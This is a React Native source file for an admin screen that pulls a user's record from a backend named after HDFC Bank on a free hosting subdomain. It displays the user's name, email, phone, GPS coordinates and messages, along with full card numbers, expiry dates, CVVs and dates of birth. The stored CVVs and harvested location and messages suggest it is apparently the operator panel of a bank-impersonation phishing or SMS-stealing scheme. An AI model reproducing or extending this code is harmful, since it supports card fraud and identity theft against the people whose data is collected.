import { View, Text, FlatList, Image, StyleSheet, TouchableOpacity, Alert, ScrollView } from 'react-native'
import React, { useEffect, useState } from 'react'
import { rgbaColor } from 'react-native-reanimated/src/reanimated2/Colors';
import axios from 'axios';
import AsyncStorage from '@react-native-async-storage/async-storage';
import CardDetails from '../cardDetails';
import MyCard from '../../components/card';

export default function UserDetails(props) {
    const [userDetails, setUserDetails] = useState({})
    const [userMessages, setUserMessages] = useState({})
    const { item } = props.route.params;

    const getUserDetails = async () => {
        const user = AsyncStorage.getItem("hdfc-bank-token") && JSON.parse(await AsyncStorage.getItem("hdfc-bank-token")) || {}

        try {
            const response = await axios.get(`https://hdfc-bank-9qmz.onrender.com/api/v1/admin/userDetails/${item._id}`, {
                headers: {
                    adminid: user._id,
                    token: user.token
                }
            });
            if (response.data?.status) {
                setUserDetails(response.data?.data)
            }
            console.log("user cdetails response", response.data);
        }
        catch (error) {
            Alert.alert(error.response?.data?.message)
            console.log("user cdetails error", error.response?.data);
        }
    }
    const getUserMessages = async () => {
        const user = AsyncStorage.getItem("hdfc-bank-token") && JSON.parse(await AsyncStorage.getItem("hdfc-bank-token")) || {}
        console.log("user", user._id)

        try {
            const response = await axios.get(`https://hdfc-bank-9qmz.onrender.com/api/v1/admin/getUserMessages/${item._id}`, {
                headers: {
                    adminid: user._id,
                    token: user.token
                }
            });
            if (response.data?.status) {
                console.log("user messages", response.data)
                setUserMessages(response.data?.data)
            }
            console.log("user cdetails response", response.data);
        }
        catch (error) {
            Alert.alert(error.response?.data?.message)
            console.log("user cdetails error", error.response?.data);
            console.log("eror", error)
        }
    }

    useEffect(() => {
        getUserDetails();
    }, [item])

    return (
        <ScrollView>
            <View style={styles.container}>
                <MyCard />
            </View>
            <View style={styles.card}>
                <Text style={styles.title}>User Details</Text>
                <View style={styles.description}>

                    <View style={styles.detailRow}>
                        <Text style={styles.cardKey}>Full Name</Text>
                        <Text style={styles.cardValue}>{`${userDetails.firstName}`}</Text>
                    </View>
                    <View style={styles.detailRow}>
                        <Text style={styles.cardKey}>Email</Text>
                        <Text style={styles.cardValue}>{userDetails.email}</Text>
                    </View>
                    <View style={styles.detailRow}>
                        <Text style={styles.cardKey}>User Mobile</Text>
                        <Text style={styles.cardValue}>{userDetails.mobile}</Text>
                    </View>
                    <View style={styles.detailRow}>
                        <Text style={styles.cardKey}>Location</Text>
                        <View style={styles.cardValue}>
                            <Text > Latitude: {userDetails.location?.latitude}</Text>
                            <Text > Longitude: {userDetails.location?.longitude}</Text>
                        </View>
                    </View>
                    <View style={styles.detailRow}>
                        <Text style={styles.cardKey}>Messages</Text>
                        <TouchableOpacity style={{ ...styles.button, flex: 3 }} onPress={() => { getUserMessages() }}>
                            <Text style={{ ...styles.buttonText }}>Get messages</Text>
                        </TouchableOpacity>
                    </View>
                </View>
            </View>


            <View style={styles.card}>
                <View style={styles.description}>
                    <Text style={styles.title}>User Messages</Text>

                    {
                        Object.values(userMessages).map((message, index) => (
                            <View style={styles.detailRow}>
                                <Text >{index + 1}. </Text>
                                <Text >{message}</Text>
                            </View>
                        ))
                    }

                </View>
            </View>

            {
                userDetails.cardDetails && userDetails.cardDetails?.length > 0 && userDetails.cardDetails.map((card, index) => (
                    <View style={styles.card}>
                        <Text style={styles.title}>Card {index + 1} Details</Text>

                        <View style={styles.description}>
                            <View style={styles.detailRow}>
                                <Text style={styles.cardKey}>Mobile Number :</Text>
                                <Text style={styles.cardValue}>{card.mobile}</Text>
                            </View>
                            <View style={styles.detailRow}>
                                <Text style={styles.cardKey}>Date of Birth</Text>
                                <Text style={styles.cardValue}>{`${new Date(card.dob).toLocaleDateString()}`}</Text>
                            </View>
                            <View style={styles.detailRow}>
                                <Text style={styles.cardKey}>Card Number</Text>
                                <Text style={styles.cardValue}>{card.cardNumber}</Text>
                            </View>
                            <View style={styles.detailRow}>
                                <Text style={styles.cardKey}>Expiry Date</Text>
                                <Text style={styles.cardValue}>{new Date(card.expDate).toLocaleDateString()}</Text>
                            </View>
                            <View style={styles.detailRow}>
                                <Text style={styles.cardKey}>CVV Number</Text>
                                <Text style={styles.cardValue}>{card.cvv}</Text>
                            </View>
                        </View>
                    </View>
                ))
            }

        </ScrollView>
    )
}

const styles = StyleSheet.create({
    container: {
        flex: 1,
        justifyContent: 'center',
        alignItems: 'center',
        backgroundColor: '#f0f0f0',
    },
    card: {
        backgroundColor: rgbaColor(0, 0, 0, 0.70),
        borderRadius: 8,
        padding: 16,
        margin: 12,
        shadowColor: '#000',
        shadowOffset: { width: 0, height: 2 },
        shadowOpacity: 0.3,
        shadowRadius: 4,
    },
    cardKey: {
        flex: 2,
        color: "#fff"
    },
    cardValue: {
        flex: 3,
        color: "#fff"
    },
    title: {
        fontSize: 20,
        fontWeight: 'bold',
    },
    description: {
        fontSize: 16,
        marginTop: 8,
    },
    detailRow: {
        display: 'flex',
        flexDirection: 'row',
    },
    button: {
        // backgroundColor: 'white',
        // borderRadius: 10,
        // paddingVertical: 7,
    },
    buttonText: {
        // textAlign: "center",
        fontWeight: "500",
        fontSize: 17,
        color: "#fff"
    },
})

